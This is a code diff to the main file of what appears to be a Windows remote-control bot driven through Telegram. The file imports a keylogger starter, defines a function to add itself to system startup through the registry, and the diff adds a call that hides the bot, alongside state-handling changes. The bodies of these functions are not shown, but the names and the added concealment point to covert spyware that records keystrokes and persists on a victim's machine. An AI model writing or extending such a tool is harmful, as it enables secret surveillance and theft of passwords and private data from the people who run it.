@@ -1,15 +1,15 @@
 import os
 import sys
-import time
 import winreg
 import asyncio
 
 from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command
+from aiogram.fsm.context import FSMContext
 from aiogram.types import Message, CallbackQuery
 from config import TOKEN, KNOWN_IDS
 from handlers import handle_message, send_safe_message, handle_hotkey_callback
 from loggers import setup_logging, start_keylogger
+from commands import hide_bot
 
 
 def add_to_startup():
@@ -46,10 +46,11 @@ async def main():
 
     bot = Bot(token=TOKEN)
     dp = Dispatcher()
+    hide_bot()
 
     @dp.message()
-    async def handle_all_messages(message: Message):
-        await handle_message(message, bot)
+    async def handle_all_messages(message: Message, state: FSMContext):
+        await handle_message(message, bot, state)
 
     @dp.callback_query()
     async def handle_all_callbacks(callback: CallbackQuery):
@@ -63,5 +64,3 @@ async def main():
 
 if __name__ == '__main__':
     asyncio.run(main())
-
-
